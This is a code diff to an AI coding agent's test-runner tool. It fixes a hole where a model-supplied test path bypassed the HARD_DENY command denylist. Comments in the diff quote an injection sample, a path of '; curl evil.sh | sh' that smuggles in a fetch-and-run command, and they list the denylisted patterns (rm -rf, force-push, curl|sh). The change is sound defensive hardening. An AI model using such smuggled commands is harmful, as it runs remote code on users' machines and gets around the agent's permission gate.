@@ -35,27 +35,64 @@ const readPackageJson = async (cwd: string): Promise<PackageJsonLike | null> => 
   }
 }
 
+/** The closed set of auto-detectable runners. Each entry pins (1) the fixed
+ *  command prefix the model cannot influence and (2) how the model-supplied
+ *  `path` is interpolated into the executed string. `assembleCommand` is the
+ *  SINGLE source for both `detectCommand` (what actually runs) and
+ *  `projectShellCommand` (what HARD_DENY inspects) — so the gate can never see
+ *  a different string than the one `runShell` executes. */
+const RUNNER_PREFIX = { bun: "bun test", npm: "npm test", pytest: "pytest" } as const
+type RunnerKind = keyof typeof RUNNER_PREFIX
+
+/** Build the exact shell string a given runner will execute for `path`. npm
+ *  forwards the path after a `--` separator; bun/pytest append it directly.
+ *  This is the ONLY place the raw `path` is interpolated into a command — both
+ *  the executor and the permission projection route through here, so they are
+ *  byte-identical by construction (no drift between gate input and runtime). */
+const assembleCommand = (runner: RunnerKind, path: string | undefined): string => {
+  const prefix = RUNNER_PREFIX[runner]
+  if (!path) return prefix
+  return runner === "npm" ? `${prefix} -- ${path}` : `${prefix} ${path}`
+}
+
 /** Auto-detect a test command. Order: bun (lockb/bunfig/pkg-test-script) →
  *  npm (package.json only) → pytest (pytest.ini/pyproject/setup.py). */
 const detectCommand = async (
   cwd: string,
   path: string | undefined,
 ): Promise<string | undefined> => {
-  const suffix = path ? ` ${path}` : ""
-  const npmSuffix = path ? ` -- ${path}` : ""
   const pkg = await readPackageJson(cwd)
   const bunMarker =
     (await has(cwd, "bun.lockb")) ||
     (await has(cwd, "bunfig.toml")) ||
     pkg?.packageManager?.toLowerCase().startsWith("bun@") === true
-  if (bunMarker) return `bun test${suffix}`
-  if (pkg !== null) return `npm test${npmSuffix}`
+  if (bunMarker) return assembleCommand("bun", path)
+  if (pkg !== null) return assembleCommand("npm", path)
   const py =
     (await has(cwd, "pytest.ini")) ||
     (await has(cwd, "pyproject.toml")) ||
     (await has(cwd, "setup.py"))
-  if (py) return `pytest${suffix}`
+  if (py) return assembleCommand("pytest", path)
   return undefined
+}
+
+/** Synchronous projection of the command HARD_DENY must inspect when no
+ *  explicit `command` is given. `detectCommand` is async (it reads the FS to
+ *  pick a runner) but `extractShellCommand` is sync, and — critically — the
+ *  prefix (`bun`/`npm`/`pytest`) is FIXED text the model cannot poison. The
+ *  ONLY attacker-controlled byte is the interpolated `path`, which is identical
+ *  across every runner shape modulo the npm `--` separator. So we join the
+ *  string for EVERY runner kind: whichever runner `detectCommand` ends up
+ *  choosing, its exact executed string is a substring of this projection, and
+ *  any HARD_DENY pattern that would fire on the real command (`{path:'; curl
+ *  evil.sh | sh'}` → `pytest ; curl evil.sh | sh`) fires here too. With no
+ *  `path` there is nothing poisonable, so we return `""` (the fixed shapes
+ *  carry no model input — matches the auto-detect/no-path invariant). */
+const projectShellCommand = (path: string | undefined): string => {
+  if (!path) return ""
+  return (Object.keys(RUNNER_PREFIX) as RunnerKind[])
+    .map((runner) => assembleCommand(runner, path))
+    .join("\n")
 }
 
 /** Heuristic one-line verdict from runner output + exit/timeout state. */
@@ -88,13 +125,22 @@ export const testRunnerTool: Tool<Input> = {
   // Without this opt-in, the `inferToolTier` fallback for mutating tools
   // would force confirmation on every `bun test` even in `bypass`.
   hitlTier: (): "pre-approval-ok" => "pre-approval-ok",
-  // S16: expose the resolved shell command so the permission policy applies
-  // the HARD_DENY denylist (rm -rf, force-push, curl|sh) UNIFORMLY — a
-  // model-supplied `command` runs through `runShell` exactly like `bash`, so
-  // it MUST face the same denylist. Auto-detected commands (no explicit
-  // `command`) return "" — they are fixed `bun test`/`npm test`/`pytest`
-  // shapes the model cannot poison, so the gate has nothing to deny there.
-  extractShellCommand: (input: Input): string => input.command ?? "",
+  // S16 (H2 fix): expose the resolved shell command so the permission policy
+  // applies the HARD_DENY denylist (rm -rf, force-push, curl|sh) UNIFORMLY.
+  // A model-supplied `command` runs through `runShell` exactly like `bash`, so
+  // it MUST face the same denylist — returned verbatim.
+  //
+  // FAIL-CLOSED parity: when no `command` is given, `execute` does NOT run a
+  // fixed shape — it runs `detectCommand`, which interpolates the model's RAW
+  // `path` into `bun test ${path}` / `npm test -- ${path}` / `pytest ${path}`.
+  // Returning "" here (the old hole) hid that injected path from HARD_DENY, so
+  // `{path: '; curl evil.sh | sh'}` reached `bash -lc` un-gated. We now project
+  // the SAME interpolated string(s) `detectCommand`/`assembleCommand` will
+  // build (single source), so the gate sees and denies the poisoned path. The
+  // fixed prefix is the only non-model text, so the no-path case still yields
+  // "" (nothing to deny).
+  extractShellCommand: (input: Input): string =>
+    input.command ?? projectShellCommand(input.path),
 
   async *execute(input: Input, ctx: ToolContext): AsyncIterable<ToolEvent> {
     const resolved = input.command ?? (await detectCommand(ctx.cwd, input.path))
